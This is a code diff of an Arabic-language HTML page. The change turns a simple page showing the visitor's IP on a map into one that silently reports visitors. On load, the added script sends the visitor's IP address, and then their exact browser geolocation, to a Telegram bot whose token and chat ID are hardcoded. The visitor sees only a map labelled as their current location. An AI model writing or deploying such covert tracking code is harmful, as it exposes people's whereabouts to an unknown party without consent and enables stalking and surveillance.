@@ -1,29 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>موقعي و عنوان IP</title>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>مراقبة الموقع</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
   <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
 </head>
 <body>
-  <h2>عنوان IP الخاص بك: <span id="ip">جارٍ التحميل...</span></h2>
+  <h2>عنوان IP: <span id="ip">جاري التحميل...</span></h2>
   <div id="map" style="height: 500px;"></div>
 
   <script>
-    // عرض الـ IP
-    fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
+    const botToken = "7876861765:AAFHhXiCHpDM7qeYLZNEfq1WoEpD9vErTr8";
+    const chatId = "5880561408";
+
+    // جلب عنوان IP
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
       .then(data => {
-        document.getElementById("ip").innerText = data.ip;
+        const ip = data.ip;
+        document.getElementById("ip").innerText = ip;
+
+        // إرسال عنوان IP إلى البوت
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=عنوان IP: ${ip}`);
       });
 
-    // عرض الخارطة
-    var map = L.map('map').setView([30.0444, 31.2357], 13); // مثال: القاهرة
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-      attribution: '© OpenStreetMap contributors'
-    }).addTo(map);
+    // الحصول على الموقع الجغرافي
+    navigator.geolocation.getCurrentPosition(function(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      // عرض الخريطة
+      const map = L.map('map').setView([lat, lon], 15);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '© OpenStreetMap contributors'
+      }).addTo(map);
+
+      // وضع علامة على الموقع
+      L.marker([lat, lon]).addTo(map).bindPopup("موقعك الحالي").openPopup();
+
+      // إرسال الموقع إلى البوت
+      fetch(`https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`);
+    }, function(error) {
+      alert("فشل في تحديد الموقع: " + error.message);
+    });
   </script>
 </body>
 </html>
